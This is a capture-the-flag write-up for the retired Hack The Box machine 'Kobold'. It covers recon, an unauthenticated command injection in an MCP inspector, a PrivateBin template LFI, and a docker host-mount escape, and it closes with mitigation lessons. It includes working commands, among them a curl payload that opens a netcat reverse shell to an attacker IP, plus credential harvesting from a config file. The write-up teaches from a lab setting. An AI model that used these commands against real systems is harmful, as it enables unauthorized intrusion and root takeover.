---
machine: Kobold
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, mcp, cve-2026-23744, privatebin, docker, container-escape]
---

# Kobold — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Three modern services: **MCPJam Inspector 1.4.2** (an MCP server viewer), **PrivateBin 2.0.2** and **Arcane 1.13.0** (Docker management). The inspector carries **CVE-2026-23744** (fixed in 1.4.3): `/api/mcp/connect` passes the `command` field to `child_process.spawn()` with no authentication, so one JSON body gives a shell as `ben`. From there, the `operator` group can write into the data directory PrivateBin mounts into its container, and its template LFI (**CVE-2025-64714**, 1.7.7–2.0.2, patched in 2.0.3) executes the PHP through the `template` cookie; the panel config leaks credentials that open Arcane as admin, and a privileged container with `/` mounted finishes the box.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.kobold.htb" -w subdomains.txt -mc 200,403
```

```text
22/tcp    ssh
80/tcp    http   nginx (vhosts)
3552/tcp  http   Arcane (Docker management)
```

```text
mcp.kobold.htb  -> MCPJam Inspector  (127.0.0.1:6274, HTTPS only, via nginx)
bin.kobold.htb  -> PrivateBin 2.0.2   (127.0.0.1:8080, container)
```

## Foothold: CVE-2026-23744

```bash
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d @- <<'JSON'
{
  "name": "pwn",
  "command": "busybox",
  "args": ["sh", "-c", "busybox nc <IP> 4444 -e /bin/sh"]
}
JSON
```

```bash
nc -lvnp 4444
```

```text
uid=1000(ben) gid=1000(ben) groups=1000(ben)
```

## Group enumeration

```bash
id
getent group | grep -E "ben|operator|docker"
ls -ld /privatebin-data /privatebin-data/data
```

`ben` belongs to a non-default group that can write into the PrivateBin data directory: that is the real lead. The `docker` membership matters only if `getent group docker` actually lists the user. Public writeups disagree here — some show it in `id` and open the socket with `newgrp docker`, others reach the same place through Arcane and never touch `/var/run/docker.sock` — so verify it on the box instead of assuming the group.

## Escalation I: PrivateBin and Arcane

```bash
ls -ld /privatebin-data/data
# drwxrwx--- operator  -> writable by the group
```

That host directory is mounted into the PrivateBin container, and the container's `php -S` serves from it. Drop a `.php` and request it as a template through the **cookie** `template`, resolved relative to `tpl/`:

```bash
curl -s --cookie "template=../../data/<file>" http://bin.kobold.htb/
```

The LFI (CVE-2025-64714) includes the file and runs the code **inside the container**. From that shell, read the config to get the Arcane credentials:

```bash
cat /opt/privatebin/cfg/conf.php | grep -i -A2 "arcane\|password"
```

Those credentials work on **Arcane** (`:3552`) as administrator.

## Escalation II: privileged container

```bash
newgrp docker        # if the group exists but is not active
docker run -v /:/host --rm -it alpine chroot /host bash
```

```text
root@kobold:/# cat /root/root.txt
```

In Arcane the equivalent is logging in as admin (`admin`/`<password>`) and creating a privileged container with the host volume mounted. Arcane is a UI over the same Docker daemon, so an admin account there is equivalent to the `docker` group: whichever of the two doors is open, the result is the host's filesystem.

## Evidence (redacted)

```text
/home/ben/user.txt  -> <user_flag>
/root/root.txt      -> <root_flag>
```

## Lessons

- AI development tooling (MCP, viewers, agents) assumes a "trusted local environment"; exposed to the network it is unauthenticated RCE.
- `spawn(user_command)` without an allowlist is execution by design.
- Belonging to `docker` (or to a group that can write where another service mounts) equals root.
- Mitigation: authentication and an allowlist in the inspector, never expose it, minimal groups, and PrivateBin with fixed templates plus `open_basedir`.
